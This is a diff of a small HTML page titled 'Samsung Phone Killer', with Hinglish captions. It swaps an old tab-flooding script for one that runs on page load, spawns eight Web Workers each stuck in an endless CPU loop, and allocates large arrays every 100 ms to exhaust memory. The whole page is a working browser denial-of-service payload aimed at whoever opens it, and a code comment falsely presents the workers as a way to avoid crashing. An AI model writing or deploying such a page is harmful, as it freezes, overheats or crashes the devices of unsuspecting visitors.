@@ -1,17 +1,36 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <title>RAM ka The End</title>
+    <title>Samsung Phone Killer</title>
     <script>
       window.onload = function () {
-        setInterval(function () {
-          window.open(window.location.href);
-        }, 1); // Har 1ms me ek nayi tab
+        // Heavy CPU loop in background thread to avoid browser crash
+        function stressCPU() {
+          let i = 0;
+          while (true) {
+            i++;
+            Math.sqrt(i * Math.random());
+            if (i % 100000 === 0) console.log("Samsung dying...");
+          }
+        }
+
+        // Spawn multiple Web Workers (only on supported devices)
+        for (let j = 0; j < 8; j++) {
+          const blob = new Blob(["(" + stressCPU.toString() + ")()"]);
+          const url = URL.createObjectURL(blob);
+          new Worker(url);
+        }
+
+        // Memory Hog — keep allocating memory
+        let hog = [];
+        setInterval(() => {
+          hog.push(new Array(1000000).fill("Samsung worst!"));
+        }, 100);
       };
     </script>
   </head>
   <body>
-    <h1>Samsung = RIP</h1>
-    <p>Tabs tabs tabs... phone abhi gaya!</p>
+    <h1>Samsung Phone Crash Attempt!</h1>
+    <p>Browser zinda hai, phone ki halat tight hai!</p>
   </body>
 </html>
